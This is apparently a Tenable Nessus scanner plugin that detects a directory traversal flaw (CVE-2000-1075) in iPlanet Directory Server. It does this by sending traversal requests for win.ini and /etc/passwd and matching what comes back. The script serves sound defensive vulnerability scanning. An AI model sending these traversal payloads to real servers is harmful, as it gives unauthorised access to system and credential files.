#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10589);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-1075");
 script_bugtraq_id(1839);
 script_xref(name:"OSVDB", value:"486");
 script_xref(name:"OSVDB", value:"4086");

 script_name(english:"iPlanet Directory Server Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"There is a bug in the remote iPlanet web server that allows a user to
read arbitrary files on the remote host. 

To exploit this flaw, an attacker needs to prepend '/\../\../'
to the file name to read." );
 script_set_attribute(attribute:"solution", value:
"http://www.iplanet.com/downloads/patches/index.html" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
 script_summary(english:"/\../\../\file.txt");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8100);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
 local_var r, report, u1, u2, u3, w;

 u1 = string("/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini");		
 u2 = string("/ca/..\\..\\..\\..\\..\\..\\winnt/\\win.ini");
 u3 = string("/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd");

 w = http_send_recv3(method: "GET", port:port, item: u1);
 if (isnull(w)) return(0);
 r = w[2];

 if("[windows]" >< r){
	report = '\nBy requesting ' + u1 + ' one obtains :\n' + r;
  	security_warning(port:port, extra:report);
	return(0);
	}
	
 w = http_send_recv3(method:"GET", port:port, item: u2);
 if (isnull(w)) exit(0);
 r = w[2];
 if("[fonts]" >< r){
	report = '\nBy requesting ' + u2 + ' one obtains :\n' + r;
  	security_warning(port:port, extra:report);
	return(0);
	}
	
  w = http_send_recv3(port:port, method:"GET", item: u3);
  if (isnull(w)) exit(0);
  r = w[2];
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
	{
	report = '\nBy requesting ' + u3 + ' one obtains :\n' + r;
  	security_warning(port:port, extra:report);
	return(0);
	}
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8100);

foreach port (ports)
{
 banner = get_http_banner(port:port);
 if ( "iPlanet" >!< banner && report_paranoia < 2) exit(0);
 check(port:port);
}
